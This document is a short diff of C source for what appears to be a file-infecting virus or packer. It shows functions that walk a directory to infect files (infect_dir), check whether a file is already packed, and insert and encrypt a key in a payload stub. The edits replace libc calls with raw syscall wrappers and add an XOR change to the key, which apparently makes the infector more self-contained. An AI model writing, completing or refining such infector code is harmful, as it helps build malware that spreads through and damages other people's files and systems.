@@ -35,7 +35,7 @@ static int _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
 	char *ns;
 	//if ((ns = (char *)malloc((*n1) + n2)) == NULL)
 	//	return FALSE;
-	ns = (void*)CALL(MMAP, NULL, (*n1) + n2, 6, 34, -1, 0);
+	ns = (void*)CALL(SYS_mmap, NULL, (*n1) + n2, 6, 34, -1, 0);
 	if (SYS_HAVE_FAIL(ns))
 		return FALSE;
 	size_t i,j,l;
@@ -49,7 +49,7 @@ static int _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
 
 static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 	//char *ns = (char *)malloc((*n) + add);
-	char *ns = (void*)CALL(MMAP, NULL, (*n) + add, 6, 34, -1, 0);
+	char *ns = (void*)CALL(SYS_mmap, NULL, (*n) + add, 6, 34, -1, 0);
 	if (SYS_HAVE_FAIL(ns))
 		return ; // TODO
 	size_t i,j,l;
@@ -79,6 +79,7 @@ void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt)
 	//inserting KEY
 	p[3] = ((size_t*)key)[0];
 	p[4] = ((size_t*)key)[1];
+	*(unsigned char*)(p + 3) ^= 0b01110010;
 	encrypt((char*)(p+5), 15, (uint32_t*)key);
 }
 
@@ -140,7 +141,7 @@ int check_already_packed(char *s, size_t n){
 }
 
 char *debug_name(char *fname){
-	char *s = malloc(slen(fname)+5);
+	char *s = ft_malloc(slen(fname)+5);
 	int x;
 	for (x = 0; fname[x]; x++)
 		s[x] = fname[x];
@@ -192,7 +193,7 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 	char		tmp[LIM];
 	int		fd;
 
-	if ((fd = open(dirname, 65536, 0)) < 0) return fail("open dir");
+	if ((fd = ft_open(dirname, 65536, 0)) < 0) return fail("open dir");
 	while (1)
 	{
 		int size = getdents(fd, p, sizeof(p));
@@ -200,7 +201,7 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 			break;
 		if (size < 0)
 		{
-			close(fd);
+			ft_close(fd);
 			return fail("read dir");
 		}
 		size_t x = 0;
@@ -217,6 +218,6 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 			x += d->d_reclen;
 		}
 	}
-	close(fd);
+	ft_close(fd);
 }
 
